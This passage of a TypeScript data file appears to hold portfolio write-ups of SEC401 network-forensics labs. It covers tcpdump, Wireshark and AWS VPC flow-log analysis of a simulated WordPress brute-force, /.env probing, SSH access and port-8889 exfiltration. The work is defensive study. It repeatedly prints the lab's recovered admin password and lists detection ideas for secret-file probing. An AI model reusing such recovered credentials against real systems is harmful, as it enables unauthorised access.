export interface LabScreenshot {
  src: string;
  alt?: string;
  caption?: string;
}

export interface LabStep {
  title: string;
  description: string;
  command?: string;
  /** Brief explanation of each flag (e.g. "-n: no hostname lookup") */
  commandBreakdown?: string;
  screenshot?: string;
}

export interface CybersecurityLab {
  id: number;
  /** URL segment for course (e.g. "sec401", "aws") */
  courseSlug: string;
  /** URL segment for this lab (e.g. "tcpdump-traffic-analysis") */
  slug: string;
  /** Legacy flat slug for redirects (e.g. "sec401-tcpdump") */
  legacySlug?: string;
  title: string;
  course?: string;
  role?: string;
  /** Focus area (e.g. "Network Forensics") */
  focus?: string;
  /** Level/course code (e.g. "SEC401") */
  level?: string;
  /** Completion date (e.g. "Feb 2026") */
  date?: string;
  /** Artifacts included (e.g. "Sanitized screenshots + my own DNS capture PCAP") */
  artifacts?: string;
  /** 3-line TL;DR for recruiters */
  tldr?: string[];
  /** Skills demonstrated (ATS-friendly) */
  skillsDemonstrated?: string[];
  context: string;
  /** Brief summary for main page card (1–2 sentences) */
  summary: string;
  /** Why this matters in a real attack; show early */
  whyThisMatters: string;
  tools: string[];
  steps: string[];
  stepDetails?: LabStep[];
  outcome: string;
  /** What you'd do next in a real production environment */
  nextStepsInProduction?: string;
  /** Security controls relevant to findings */
  securityControlsRelevant?: string[];
  keyFindings?: string[];
  reportDownloadLink?: string;
  reportDownloadLabel?: string;
  screenshots?: LabScreenshot[];
  /** Original analysis: what this means in practice, what orgs get wrong, your perspective */
  takeaway?: string[];
  comingSoon?: boolean;
}

export const LABS: CybersecurityLab[] = [
  {
    id: 1,
    courseSlug: "sec401",
    slug: "tcpdump-traffic-analysis",
    legacySlug: "sec401-tcpdump",
    title: "Lab 1.1 – tcpdump Traffic Analysis",
    course: "SEC401 - Network Security and Cloud Essentials",
    role: "Solo, Lab",
    context: "This lab demonstrates how to analyze network traffic using tcpdump and extract meaningful patterns from a PCAP file.",
    summary: "Analyzed PCAP traffic with tcpdump: identified /.env probing, WordPress brute-force with Hydra, and cleartext login parameters visible in the HTTP payload.",
    whyThisMatters: "In a real attack, unencrypted HTTP exposes credentials to anyone on the network. This is what defenders see when investigating a breach, and why HTTPS and secure credential handling are non-negotiable in production.",
    focus: "Network Forensics",
    level: "SEC401",
    date: "Feb 2026",
    artifacts: "Sanitized screenshots + my own DNS capture PCAP",
    tldr: [
      ".env probing attempt observed",
      "WordPress login brute force detected",
      "Demonstrates credential exposure risk over plaintext HTTP",
    ],
    skillsDemonstrated: [
      "Packet capture triage",
      "tcpdump filtering",
      "HTTP session analysis",
      "DNS correlation",
      "Attacker pattern recognition",
    ],
    tools: ["tcpdump", "dig", "PCAP analysis", "CLI"],
    steps: [
      "Initial packet overview: tcpdump -n -r investigate.pcap -c 20 -#",
      "Filtered session 1 (135.125.217.54): GET /.env, 404",
      "Read session.pcap: tcpdump -n -r session.pcap -#",
      "HTTP payload extraction: wp-login.php, visible login parameters",
      "Correlate with dig alphainc.ca NS",
      "Live DNS capture and read created_capture.pcap",
      "DNS payload extraction: tcpdump -X on created_capture.pcap",
    ],
    stepDetails: [
      {
        title: "Initial packet overview",
        description: "Read the first 20 packets from investigate.pcap to get a high-level view of traffic types (DNS, TCP, HTTP).",
        command: "tcpdump -n -r investigate.pcap -c 20 -#",
        commandBreakdown: "-n: no DNS/port lookup\n-r: read from file\n-c 20: stop after 20 packets\n-#: print packet number",
        screenshot: "/labs/tcpdump-145021.png",
      },
      {
        title: "Filtering session 1: GET /.env",
        description: "Filtered TCP traffic between 135.125.217.54 and 10.130.8.94 (ports 44366 and 80). Revealed an HTTP GET request for /.env; server responded 404 Not Found.",
        command: "tcpdump -n -r investigate.pcap 'tcp and (host 135.125.217.54 and host 10.130.8.94) and (port 44366 and port 80)'",
        commandBreakdown: "Filter: tcp + host/port pair",
        screenshot: "/labs/tcpdump-150012.png",
      },
      {
        title: "Read session.pcap",
        description: "Read session.pcap to view the filtered wp-login session packets.",
        command: "tcpdump -n -r session.pcap -#",
        screenshot: "/labs/tcpdump-150547.png",
      },
      {
        title: "HTTP payload extraction: visible login parameters",
        description: "Dumped packet contents. Revealed cleartext HTTP POST to /wp-login.php with Hydra user-agent and visible login parameters (redacted).",
        command: "tcpdump -n -r session.pcap -X -v -c 4",
        commandBreakdown: "-X: hex and ASCII payload; -v: verbose; -c 4: stop after 4 packets",
        screenshot: "/labs/tcpdump-150815.png",
      },
      {
        title: "Correlate with dig",
        description: "Used dig to query NS records for alphainc.ca, correlating with the captured DNS traffic.",
        command: "dig alphainc.ca NS",
        commandBreakdown: "alphainc.ca: domain; NS: name server",
        screenshot: "/labs/tcpdump-151413.png",
      },
      {
        title: "Live DNS capture and read",
        description: "Captured live UDP traffic on port 53 (DNS) with sudo tcpdump, wrote to created_capture.pcap, then read the capture to view DNS queries and responses.",
        command: "sudo tcpdump -n -i eth0 -w created_capture.pcap 'udp port 53'\ntcpdump -n -r created_capture.pcap",
        commandBreakdown: "-i: interface; -w: write to file; Filter: udp port 53",
        screenshot: "/labs/tcpdump-151524.png",
      },
      {
        title: "DNS payload extraction",
        description: "Dumped DNS packet contents in hex and ASCII, revealing domain names in the payload.",
        command: "tcpdump -n -r created_capture.pcap -X",
        screenshot: "/labs/tcpdump-151610.png",
      },
    ],
    outcome:
      "This lab reinforced how quickly attacker behavior stands out in raw packet captures once you know what to filter for. It also highlighted how dangerous plaintext HTTP is in real environments, since authentication data can be recovered directly from packet payloads.",
    nextStepsInProduction:
      "If this were production: I'd confirm whether the source was internal or external, check web server logs for repeated attempts, enforce HTTPS, and apply rate limiting or WAF protections around authentication endpoints.",
    securityControlsRelevant: [
      "Enforce HTTPS (HSTS)",
      "Rate-limit wp-login",
      "WAF rules for /.env probing",
      "Centralized logging + alerting (SIEM)",
    ],
    keyFindings: [
      "HTTP GET /.env from 135.125.217.54 to 10.130.8.94; server returned 404",
      "HTTP POST /wp-login.php with Hydra user-agent",
      "DNS NS lookup mapped alphainc.ca to AWS nameservers",
    ],
    takeaway: [
      "The /.env probe is one of the most common automated scans on the internet, but most teams only monitor for it at the WAF layer. The real question isn't whether you block it, it's whether you alert on it. A 404 response means the file wasn't there, but the attacker now knows the server is live, running a web framework, and worth further probing. That single failed request often precedes the brute-force attempt that follows minutes later.",
      "What stood out in this lab was how readable cleartext HTTP traffic is. The WordPress credentials were sitting in the packet payload, fully visible, with no decryption required. This is obvious in theory, but seeing it in a real PCAP changes how you think about HTTPS enforcement. It's not just a compliance checkbox. Any network segment without TLS is functionally broadcasting credentials to anyone with tcpdump access.",
      "If I were building detection rules from this capture, I'd focus on two signals: any outbound DNS query to a domain immediately followed by HTTP POST to a login endpoint from a different source IP, and any user-agent string containing known tool signatures like Hydra. These are low-noise, high-confidence indicators that most SIEMs can correlate in real time.",
    ],
    screenshots: [
      { src: "/labs/tcpdump-145021.png", alt: "Step 1: Initial packet overview", caption: "tcpdump -n -r investigate.pcap -c 20 -#" },
      { src: "/labs/tcpdump-150012.png", alt: "Step 2: Filtered session 1", caption: "GET /.env, 404 (135.125.217.54)" },
      { src: "/labs/tcpdump-150547.png", alt: "Step 3: Read session.pcap", caption: "tcpdump -n -r session.pcap -#" },
      { src: "/labs/tcpdump-150815.png", alt: "Step 4: HTTP payload extraction", caption: "tcpdump -n -r session.pcap -X -v -c 4 (wp-login.php, visible login parameters)" },
      { src: "/labs/tcpdump-151413.png", alt: "Step 5: Correlate with dig", caption: "dig alphainc.ca NS" },
      { src: "/labs/tcpdump-151524.png", alt: "Step 6: Live DNS capture and read", caption: "sudo tcpdump -n -i eth0 -w created_capture.pcap 'udp port 53'; tcpdump -n -r created_capture.pcap" },
      { src: "/labs/tcpdump-151610.png", alt: "Step 7: DNS payload extraction", caption: "tcpdump -n -r created_capture.pcap -X" },
    ],
  },
  {
    id: 2,
    courseSlug: "sec401",
    slug: "wireshark-packet-analysis",
    legacySlug: "wireshark",
    title: "Lab 1.2 – Wireshark Packet Analysis",
    course: "SEC401 - Network Security and Cloud Essentials",
    role: "Solo, Lab",
    context:
      "This lab demonstrates how to use Wireshark's GUI-based packet analysis to investigate a 628K-packet PCAP, identify attack patterns through protocol hierarchy and conversation statistics, and reconstruct attacker sessions using display filters and stream following.",
    summary:
      "Investigated a 628K-packet PCAP in Wireshark: used protocol hierarchy and conversation statistics to surface a port-80 scanning pattern from 3.142.238.241, followed an HTTP stream revealing a successful WordPress brute-force login (Hydra, admin/#AlphaInc!), and completed a live-capture exercise extracting an HTTP object from loopback traffic.",
    whyThisMatters:
      "Wireshark turns raw packets into actionable intelligence. In incident response, the ability to quickly triage hundreds of thousands of packets using statistics, filters, and stream reconstruction is what separates a useful analyst from someone drowning in data. This lab builds exactly that muscle.",
    focus: "Network Forensics",
    level: "SEC401",
    date: "Mar 2026",
    artifacts: "Sanitized screenshots from Wireshark GUI analysis",
    tldr: [
      "Triaged 628K packets using protocol hierarchy and conversation statistics",
      "Reconstructed a successful WordPress brute-force login via HTTP stream following",
      "Completed live capture + HTTP object export on loopback traffic",
    ],
    skillsDemonstrated: [
      "Wireshark protocol hierarchy analysis",
      "Conversation and endpoint statistics",
      "Display filter construction",
      "TCP stream reconstruction",
      "HTTP object export",
      "Live packet capture",
      "Attacker pattern recognition",
    ],
    tools: ["Wireshark", "PCAP analysis", "Display filters", "HTTP stream following"],
    steps: [
      "Opened investigate.pcap (628,631 packets) and inspected initial TCP handshake + GET /.env",
      "Protocol Hierarchy Statistics: TCP 88.2%, HTTP 22.6%, TLS 44.3%, DNS 1.1%",
      "Conversations (TCP): identified 3.142.238.241 scanning port 80 across many ephemeral ports",
      "Endpoints (TCP): confirmed 1.1.1.1, 3.5.129.171, and mass 3.142.238.241 connections",
      "Built display filter: ip.addr == 20.106.124.93",
      "Followed HTTP stream (tcp.stream eq 13299): POST /wp-login.php with Hydra user-agent, 302 Found",
      "Inspected decoded form data: log=admin, pwd=#AlphaInc!, redirect to /wp-admin/",
      "Lab environment setup: ./lab-1.2 start, launched Wireshark with sudo",
      "Browsed localhost:8080/welcome.html, captured loopback HTTP traffic",
      "Applied http filter on live capture, inspected GET /workbook/ requests",
      "Exported HTTP object (file.txt): 'You completed the lab! Congratulations!'",
    ],
    stepDetails: [
      {
        title: "Initial PCAP inspection",
        description:
          "Opened investigate.pcap in Wireshark (628,631 packets). The first packets show a TCP three-way handshake between 135.125.217.54 and 10.130.8.94, followed by an HTTP GET /.env returning 404 Not Found. Same reconnaissance probe identified in Lab 1.1 with tcpdump.",
        screenshot: "/labs/wireshark-093147.png",
      },
      {
        title: "Protocol Hierarchy Statistics",
        description:
          "Statistics → Protocol Hierarchy revealed the traffic composition: TCP dominated at 88.2% (554K packets), with HTTP at 22.6% and TLS at 44.3%. UDP accounted for 11.8%, with DNS at 1.1%. SMB2 (3.1%) and SSH (1.1%) also present. This gives an instant overview of what protocols to investigate.",
        screenshot: "/labs/wireshark-094707.png",
      },
      {
        title: "Conversation statistics: scanning pattern",
        description:
          "Statistics → Conversations → TCP tab exposed a clear pattern: 3.142.238.241 made hundreds of short-lived connections to 10.130.8.94 on port 80, each with exactly 10 packets and ~1,375 bytes. This uniform, high-volume pattern is consistent with automated scanning or brute-force activity.",
        screenshot: "/labs/wireshark-094854.png",
      },
      {
        title: "Endpoint statistics",
        description:
          "Statistics → Endpoints → TCP tab confirmed the top talkers: 1.1.1.1 (ports 80 and 443), 3.5.129.171 (port 443), and the mass of 3.142.238.241 ephemeral-port connections. This helps prioritize which hosts to investigate further.",
        screenshot: "/labs/wireshark-095035.png",
      },
      {
        title: "Display filter construction",
        description:
          "Used Analyze → Display Filter Expression to build a filter for ip.addr == 20.106.124.93. The GUI filter builder shows available fields, operators, and validates the expression before applying. Helpful for constructing complex filters without memorizing syntax.",
        command: "ip.addr == 20.106.124.93",
        commandBreakdown: "ip.addr: match source or destination IP\n==: exact match operator",
        screenshot: "/labs/wireshark-095448.png",
      },
      {
        title: "HTTP stream: WordPress brute-force success",
        description:
          "Right-clicked → Follow → HTTP Stream on tcp.stream eq 13299. Revealed a POST to /wp-login.php from a Hydra user-agent with credentials in cleartext. The server responded 302 Found with WordPress authentication cookies and a redirect to /wp-admin/, confirming a successful brute-force login.",
        command: "tcp.stream eq 13299",
        commandBreakdown: "tcp.stream: isolate a single TCP conversation\neq 13299: stream index from Wireshark's reassembly",
        screenshot: "/labs/wireshark-095941.png",
      },
      {
        title: "Decoded form data inspection",
        description:
          "Wireshark's protocol dissection decoded the URL-encoded form body: log=admin, pwd=#AlphaInc!, wp-submit=Log In, redirect_to=http://www.alphainc.ca/wp-admin/. Extracting structured fields from raw bytes is where Wireshark's GUI shines over command-line tools.",
        screenshot: "/labs/wireshark-100217.png",
      },
      {
        title: "Lab environment setup",
        description:
          "Set up the lab environment: navigated to /sec401/labs/1.2, ran ./lab-1.2 start to launch the local web server, then opened Wireshark with sudo for live capture privileges.",
        command: "cd /sec401/labs/1.2 && ./lab-1.2 start && sudo wireshark 2>/dev/null &",
        commandBreakdown: "./lab-1.2 start: launch local web server\nsudo wireshark: root privileges for capture\n2>/dev/null &: suppress warnings, run in background",
        screenshot: "/labs/wireshark-100626.png",
      },
      {
        title: "Live capture: browsing the lab web app",
        description:
          "Browsed to localhost:8080/welcome.html which displayed 'Welcome to SEC401!' with a 'Download Your File' link. This generated HTTP traffic on the loopback interface for live capture analysis.",
        screenshot: "/labs/wireshark-101042.png",
      },
      {
        title: "Live capture analysis with http filter",
        description:
          "Applied the 'http' display filter on the live loopback capture. Wireshark showed GET /workbook/ and subsequent requests for CSS, JS, and image assets. Full page load dissected packet by packet. 250 packets captured, 42 displayed after filtering.",
        command: "http",
        commandBreakdown: "http: display filter showing only HTTP protocol packets\nFilters out TCP handshakes, TLS, DNS, etc.",
        screenshot: "/labs/wireshark-101109.png",
      },
      {
        title: "HTTP object export: lab completion",
        description:
          "Used File → Export Objects → HTTP to extract file.txt from the captured traffic. The file contained 'You completed the lab! Congratulations!' with ASCII art. This shows Wireshark can reconstruct and export files transferred over HTTP.",
        screenshot: "/labs/wireshark-101824.png",
      },
    ],
    outcome:
      "This lab built on the tcpdump foundation by showing how Wireshark's GUI accelerates investigation at scale. Protocol hierarchy gave an instant traffic breakdown. Conversation statistics surfaced the scanning pattern in seconds, something that would require careful scripting with tcpdump. Stream following reconstructed the full attacker session, confirming a successful WordPress brute-force with decoded credentials. The live capture exercise demonstrated end-to-end workflow: capture, filter, and extract artifacts.",
    nextStepsInProduction:
      "If this were production: I'd correlate the 3.142.238.241 scanning pattern with firewall logs and threat intel feeds, check whether the brute-forced admin account was used for lateral movement, export IOCs (IPs, user-agents, target URLs) to the SIEM, and verify that wp-login.php is protected by rate limiting, MFA, and HTTPS.",
    securityControlsRelevant: [
      "Enforce HTTPS (HSTS) to prevent credential interception",
      "MFA on WordPress admin accounts",
      "Rate-limit and geo-block wp-login.php",
      "WAF rules for automated tool user-agents (Hydra)",
      "Network segmentation to limit lateral movement",
      "Centralized logging + SIEM alerting on brute-force patterns",
    ],
    keyFindings: [
      "628,631 packets: TCP 88.2%, HTTP 22.6%, TLS 44.3%, DNS 1.1%",
      "3.142.238.241 → 10.130.8.94:80, hundreds of uniform 10-packet connections (port scanning/brute-force)",
      "Successful WordPress login: POST /wp-login.php with Hydra user-agent, admin/#AlphaInc!, 302 → /wp-admin/",
      "Live capture: HTTP object export recovered file.txt from loopback traffic",
    ],
    takeaway: [
      "The conversation statistics view in Wireshark identified the brute-force pattern in under 5 seconds. Hundreds of uniform 10-packet sessions from the same IP to port 80 is unmistakable. But here's the problem: most organizations would only catch this after the fact, in a SIEM query. The gap between 'visible in packet capture' and 'detected in production' is where most breaches live. If your IDS isn't alerting on connection volume anomalies per source IP, you're relying on an analyst opening Wireshark after someone already noticed something wrong.",
      "Following the HTTP stream that contained the successful login was the most valuable exercise. The 302 redirect to /wp-admin/ with authentication cookies confirmed the attacker was inside. In a real incident, this is the moment the investigation shifts from 'were we targeted?' to 'what did they access?' Most IR playbooks don't emphasize this transition enough. Once you confirm a successful auth, every minute you spend continuing to analyze the brute-force traffic is time the attacker is moving laterally.",
      "The protocol hierarchy breakdown (HTTP 22.6%, TLS 44.3%) tells an important story: more than half the HTTP traffic was unencrypted. In 2024+, any production environment with that ratio has a fundamental configuration problem. But I've seen this in real environments. Legacy internal apps, misconfigured load balancers, and health check endpoints that 'don't need HTTPS' create exactly this kind of exposure.",
    ],
    screenshots: [
      { src: "/labs/wireshark-093147.png", alt: "Step 1: Initial PCAP inspection", caption: "TCP handshake + GET /.env → 404 (same probe as Lab 1.1)" },
      { src: "/labs/wireshark-094707.png", alt: "Step 2: Protocol Hierarchy Statistics", caption: "TCP 88.2%, HTTP 22.6%, TLS 44.3%, DNS 1.1% across 628K packets" },
      { src: "/labs/wireshark-094854.png", alt: "Step 3: Conversation statistics", caption: "3.142.238.241 scanning port 80, hundreds of uniform 10-packet sessions" },
      { src: "/labs/wireshark-095035.png", alt: "Step 4: Endpoint statistics", caption: "Top talkers: 1.1.1.1, 3.5.129.171, mass 3.142.238.241 connections" },
      { src: "/labs/wireshark-095448.png", alt: "Step 5: Display filter construction", caption: "ip.addr == 20.106.124.93 via GUI filter builder" },
      { src: "/labs/wireshark-095941.png", alt: "Step 6: HTTP stream, WordPress brute-force", caption: "POST /wp-login.php, Hydra user-agent, 302 Found → /wp-admin/" },
      { src: "/labs/wireshark-100217.png", alt: "Step 7: Decoded form data", caption: "log=admin, pwd=#AlphaInc!, wp-submit=Log In" },
      { src: "/labs/wireshark-100626.png", alt: "Step 8: Lab environment setup", caption: "./lab-1.2 start, sudo wireshark" },
      { src: "/labs/wireshark-101042.png", alt: "Step 9: Lab web app", caption: "localhost:8080/welcome.html, Welcome to SEC401!" },
      { src: "/labs/wireshark-101109.png", alt: "Step 10: Live capture with http filter", caption: "GET /workbook/ and asset requests on loopback" },
      { src: "/labs/wireshark-101824.png", alt: "Step 11: HTTP object export", caption: "Exported file.txt, lab completion confirmed" },
    ],
  },
  {
    id: 3,
    courseSlug: "sec401",
    slug: "vpc-flow-logs",
    legacySlug: "aws-vpc-flow-logs",
    title: "Lab 1.3 - AWS VPC Flow Log Analysis",
    course: "SEC401 - Network Security and Cloud Essentials",
    role: "Solo, Lab",
    context:
      "This lab demonstrates how to analyze AWS VPC Flow Logs to investigate attacker activity at scale. Starting with 579 gzip-compressed log files containing 173,198 flow records, the goal was to extract, filter, and quantify traffic from a known attacker IP (20.106.124.93), determine the attack timeframe, calculate data transfer volumes per service, and convert PCAP data into NetFlow format for comparison analysis.",
    summary:
      "Analyzed 173K VPC flow records across 579 log files: isolated 33,232 attacker flows from 20.106.124.93, determined a 6.5-hour attack window, quantified 265MB exfiltrated on port 8889 and 190MB on port 80, and confirmed the full attack surface (HTTP, SSH, 8889) using PCAP-to-NetFlow conversion with nfpcapd/nfdump.",
    whyThisMatters:
      "VPC Flow Logs are often the first data source available during a cloud incident. Knowing how to rapidly extract attacker flows from hundreds of compressed log files, calculate data exfiltration volumes, and correlate with PCAP-derived NetFlow is exactly what a SOC analyst or incident responder does when investigating a breach in AWS.",
    focus: "Cloud Network Forensics",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized screenshots from VPC flow log analysis and NetFlow conversion",
    tldr: [
      "Extracted 33,232 attacker flows from 173K records across 579 compressed VPC log files",
      "Identified 6.5-hour attack window with 265MB exfiltrated on port 8889 and 190MB on port 80",
      "Confirmed full attack surface (ports 80, 22, 8889) via PCAP-to-NetFlow conversion with nfpcapd/nfdump",
    ],
    skillsDemonstrated: [
      "AWS VPC Flow Log analysis",
      "Bulk log file processing (zcat, zgrep)",
      "Attacker flow extraction and filtering",
      "Data exfiltration quantification",
      "Timestamp correlation (epoch conversion)",
      "PCAP-to-NetFlow conversion (nfpcapd/nfdump)",
      "Network flow analysis",
      "Attack surface enumeration",
    ],
    tools: ["AWS VPC Flow Logs", "zcat", "zgrep", "awk", "sort", "nfpcapd", "nfdump", "CLI"],
    steps: [
      "Listed 579 gzip VPC flow log files and identified format with file command",
      "Decompressed and inspected flow log header and sample records with zcat | head -4",
      "Counted total flow records across all logs: 173,198",
      "Extracted attacker flows (20.106.124.93) with zgrep into attacker-flows.log: 33,232 records",
      "Determined attack timeframe via epoch sort: Sep 28 2023 5:22 PM - 11:59 PM UTC (~6.5 hours)",
      "Calculated bytes transferred per port: 8889 = 265MB, port 80 = 190MB",
      "Converted PCAP to NetFlow with nfpcapd, analyzed with nfdump",
      "Filtered NetFlow for attacker IP: confirmed ports 80 (HTTP), 22 (SSH), 8889 (exfil)",
      "Excluded all three ports from attacker flows: no additional traffic, confirming full attack surface",
    ],
    stepDetails: [
      {
        title: "List and identify VPC flow log files",
        description:
          "Listed all files in the log directory: 579 gzip-compressed VPC flow log files. Used the file command to confirm they were gzip compressed data from a FAT filesystem, original size ~32KB each.",
        command: "ls /sec401/labs/1.3/20230928/ | wc -l\nfile /sec401/labs/1.3/20230928/2226771286B0_vpcflowlogs_us-east-2_fl-0272f42338e6eeaaf_20230928T23552_e92fb168.log.gz",
        commandBreakdown: "wc -l: count files\nfile: identify file type and compression",
        screenshot: "/labs/vpc-flow-logs-115605.png",
      },
      {
        title: "Inspect flow log format and sample records",
        description:
          "Decompressed a log file with zcat and piped to head -4 to see the header and first records. The VPC flow log format includes: version, region, account-id, instance-id, interface-id, type, srcaddr, dstaddr, srcport, dstport, protocol, bytes, packets, tcp-flags, start, end, action, log-status, flow-direction, traffic-path. First records showed 35.203.211.65 being REJECT'd and 10.130.8.94 ACCEPT'd traffic.",
        command: "zcat file /sec401/labs/1.3/20230928/2226771286B0_vpcflowlogs_us-east-2_fl-0272f42338e6eeaaf_20230928T23552_e92fb168.log.gz | head -4",
        commandBreakdown: "zcat: decompress and output to stdout\nhead -4: show header + 3 sample records",
        screenshot: "/labs/vpc-flow-logs-115724.png",
      },
      {
        title: "Count total flow records",
        description:
          "Decompressed all 579 log files and counted total lines: 173,198 flow records to investigate.",
        command: "zcat /sec401/labs/1.3/20230928/*log.gz | wc -l",
        commandBreakdown: "*log.gz: glob all compressed logs\nwc -l: count total lines",
        screenshot: "/labs/vpc-flow-logs-115859.png",
      },
      {
        title: "Extract attacker flows",
        description:
          "Used zgrep to search all compressed log files for the known attacker IP (20.106.124.93) and redirected matches to attacker-flows.log. Result: 33,232 flow records from the attacker.",
        command: "zgrep --no-filename 20.106.124.93 /sec401/labs/1.3/20230928/*log.gz > /sec401/labs/1.3/attacker-flows.log\nwc -l /sec401/labs/1.3/attacker-flows.log",
        commandBreakdown: "zgrep: grep compressed files\n--no-filename: omit file names from output\n> redirect to attacker-flows.log",
        screenshot: "/labs/vpc-flow-logs-120203.png",
      },
      {
        title: "Determine attack timeframe",
        description:
          "Sorted attacker flows by the start-time epoch field (column 15) to find the earliest and latest timestamps. Converted epochs with date -d: the attack ran from Sep 28, 2023 5:22 PM to 11:59 PM UTC, roughly 6.5 hours.",
        command: "sort -nk 15 /sec401/labs/1.3/attacker-flows.log | head -1\ndate -d @1695921755\nsort -nk 15 /sec401/labs/1.3/attacker-flows.log | tail -1\ndate -d @1695945545",
        commandBreakdown: "sort -nk 15: numeric sort on column 15 (start epoch)\ndate -d @epoch: convert epoch to human-readable",
        screenshot: "/labs/vpc-flow-logs-120457.png",
      },
      {
        title: "Quantify data transfer by port",
        description:
          "Used awk to filter attacker flows by destination port and sum the bytes field (column 12). Port 8889 transferred 265,183,813 bytes (~265MB) and port 80 transferred 190,703,527 bytes (~190MB). The high volume on port 8889 is a strong indicator of data exfiltration over a non-standard port.",
        command: "cat attacker-flows.log | awk '$10 == \"8889\"' | awk '{SUM=SUM+$12} END{print \"Total bytes transferred: \"SUM}'\ncat attacker-flows.log | awk '$9 == \"80\"' | awk '{SUM=SUM+$12} END{print \"Total bytes transferred: \"SUM}'",
        commandBreakdown: "$10 == \"8889\": filter by dst port 8889\n$9 == \"80\": filter by dst port 80\n$12: bytes field\nSUM+$12: running total",
        screenshot: "/labs/vpc-flow-logs-120852.png",
      },
      {
        title: "Convert PCAP to NetFlow with nfpcapd",
        description:
          "Used nfpcapd to convert the investigate.pcap from Lab 1.2 into NetFlow format, outputting to exported-netflow/ directory. This enables flow-level analysis of the same traffic using NetFlow tools.",
        command: "nfpcapd -r /sec401/labs/1.2/investigate.pcap -w exported-netflow/",
        commandBreakdown: "-r: read PCAP file\n-w: write NetFlow output directory",
        screenshot: "/labs/vpc-flow-logs-121229.png",
      },
      {
        title: "Analyze NetFlow with nfdump",
        description:
          "Dumped the converted NetFlow data to a text file and opened it. The output shows Date first seen, Duration, Proto, Src/Dst IP:Port, Packets, Bytes, and Flows columns. This structured format makes it easy to filter and correlate with VPC flow log findings.",
        command: "nfdump -R exported-netflow/ > pcap-derived-netflow.txt",
        commandBreakdown: "-R: read recursively from directory",
        screenshot: "/labs/vpc-flow-logs-121431.png",
      },
      {
        title: "Filter NetFlow for attacker on port 80",
        description:
          "Filtered the PCAP-derived NetFlow for the attacker IP on port 80. Confirmed HTTP traffic: 20.106.124.93:51278 to 10.130.8.94:80, matching the WordPress brute-force activity found in Labs 1.1 and 1.2.",
        command: "head -1 pcap-derived-netflow.txt; cat pcap-derived-netflow.txt | grep 20.106.124.93 | head -2",
        screenshot: "/labs/vpc-flow-logs-121640.png",
      },
      {
        title: "Filter for attacker SSH traffic",
        description:
          "Excluded port 80 and filtered for remaining attacker flows. Found SSH connections on port 22 from 20.106.124.93:38504 to 10.130.8.94:22, indicating the attacker also accessed the server via SSH.",
        command: "head -1 pcap-derived-netflow.txt; cat pcap-derived-netflow.txt | grep 20.106.124.93 | grep -v :80 | head -2",
        screenshot: "/labs/vpc-flow-logs-121731.png",
      },
      {
        title: "Identify non-standard port activity",
        description:
          "Excluded ports 80 and 22, revealing traffic on port 8889: 20.106.124.93:8889 to 10.130.8.94:36072. Port 8889 is not a well-known service (confirmed via /etc/services), making this a likely data exfiltration channel consistent with the 265MB volume found in VPC flow logs.",
        command: "head -1 pcap-derived-netflow.txt; cat pcap-derived-netflow.txt | grep 20.106.124.93 | grep -v :80 | grep -v :22 | head -2",
        commandBreakdown: "grep -v: exclude matches\nSequential exclusion isolates unknown services",
        screenshot: "/labs/vpc-flow-logs-121856.png",
      },
      {
        title: "Confirm complete attack surface",
        description:
          "Excluded all three known ports (80, 22, 8889) from attacker flows. Empty result confirmed the attacker used only these three services: HTTP for the initial brute-force, SSH for interactive access, and port 8889 for data exfiltration.",
        command: "head -1 pcap-derived-netflow.txt; cat pcap-derived-netflow.txt | grep 20.106.124.93 | grep -v :80 | grep -v :22 | grep -v :8889 | head -2",
        screenshot: "/labs/vpc-flow-logs-121944.png",
      },
    ],
    outcome:
      "This lab demonstrated how to investigate attacker activity at scale using VPC Flow Logs. Starting from 579 compressed log files with 173K records, I isolated the attacker, mapped their 6.5-hour attack window, quantified data exfiltration volumes, and confirmed the complete attack surface across three services. The PCAP-to-NetFlow conversion bridged packet-level evidence from previous labs with flow-level cloud telemetry, showing how both data sources tell the same story from different angles.",
    nextStepsInProduction:
      "If this were production: I'd feed the attacker IP into threat intel platforms for enrichment, check if port 8889 traffic triggered any IDS/IPS alerts, audit what data was accessible from the compromised instance, verify whether the SSH session was used for lateral movement to other instances, and configure VPC Flow Log alerts for anomalous outbound traffic volumes and non-standard ports.",
    securityControlsRelevant: [
      "Enable VPC Flow Logs on all subnets and ENIs",
      "Alert on high-volume outbound traffic to non-standard ports",
      "Network ACLs restricting egress to approved ports only",
      "Security group rules limiting SSH access to known IPs",
      "GuardDuty for automated anomaly detection on flow data",
      "Centralized log aggregation (CloudWatch, S3, SIEM)",
    ],
    keyFindings: [
      "579 compressed VPC flow log files, 173,198 total flow records",
      "33,232 flows from attacker IP 20.106.124.93 (~19% of all traffic)",
      "Attack window: Sep 28, 2023 5:22 PM to 11:59 PM UTC (~6.5 hours)",
      "Port 8889: 265MB transferred (data exfiltration via non-standard port)",
      "Port 80: 190MB transferred (HTTP brute-force and web access)",
      "Port 22: SSH access confirmed via NetFlow correlation",
      "No additional attacker ports found, confirming complete attack surface enumeration",
    ],
    takeaway: [
      "265MB on port 8889 is the finding that matters most in this lab, and it's the one that would be hardest to catch in production. Most security groups configure egress rules for known ports: block outbound SSH, restrict HTTP to approved destinations. But port 8889 isn't in any default deny list because it's not a well-known service. The attacker chose it precisely because it falls into the gap between 'explicitly blocked' and 'actively monitored.' The fix isn't blocking port 8889 specifically. It's flipping the egress model: deny all outbound traffic by default, and only allow what's explicitly needed.",
      "The 6.5-hour attack window raises a practical question: how long until someone notices? In this scenario, the attacker had nearly 7 hours of uninterrupted access. That's enough to exfiltrate an entire database, establish persistence, and pivot to other instances. Most organizations measure their mean-time-to-detect (MTTD) in days, not hours. GuardDuty would have flagged the unusual outbound volume, but only if it was enabled. VPC Flow Logs were there the entire time, recording everything, but nobody was watching in real time.",
      "Converting the PCAP to NetFlow with nfpcapd proved something important: packet-level and flow-level data tell the same story from different angles. In a real investigation, you often have one or the other, not both. Knowing how to work with both formats and correlate between them is the difference between confirming an attack and missing half the picture. The attacker used HTTP to get in, SSH for interactive access, and port 8889 to pull data out. Flow logs showed the volume, PCAP showed the content. Together, they give you the complete kill chain.",
    ],
    screenshots: [
      { src: "/labs/vpc-flow-logs-115605.png", alt: "Step 1: List VPC flow log files", caption: "579 gzip-compressed VPC flow log files identified" },
      { src: "/labs/vpc-flow-logs-115724.png", alt: "Step 2: Inspect flow log format", caption: "zcat | head -4: VPC flow log header and sample REJECT/ACCEPT records" },
      { src: "/labs/vpc-flow-logs-115859.png", alt: "Step 3: Count total flow records", caption: "173,198 flow records across all 579 log files" },
